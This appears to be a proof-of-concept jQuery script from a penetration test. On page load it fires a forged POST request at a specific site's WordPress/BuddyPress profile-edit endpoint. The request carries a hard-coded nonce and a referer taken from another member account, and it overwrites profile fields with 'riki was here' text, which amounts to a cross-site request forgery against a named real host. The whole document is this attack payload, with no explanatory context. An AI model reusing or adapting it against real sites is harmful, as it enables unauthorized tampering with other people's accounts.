
    $(document).ready(function(){
        $.ajax({
            type: 'POST',

            url: 'https://baru.arkademi.com/members/pentest3/profile/edit/group/1/',
            data: {
                "field_1": "riki + washing + here",
                "field_12": "riki + washing + here",
                "field_13": "riki + was + here",
                "profile-group-edit-submit": "Save + Changes +",
                "field_ids": "1, 12, 13",
                "_wpnonce": "75b45a8856",
                "_wp_http_referer": "/members/pentest2/profile/edit/group/1/"
    },
            success: function (msg) {
                alert('sukses!');

            }
        });
});
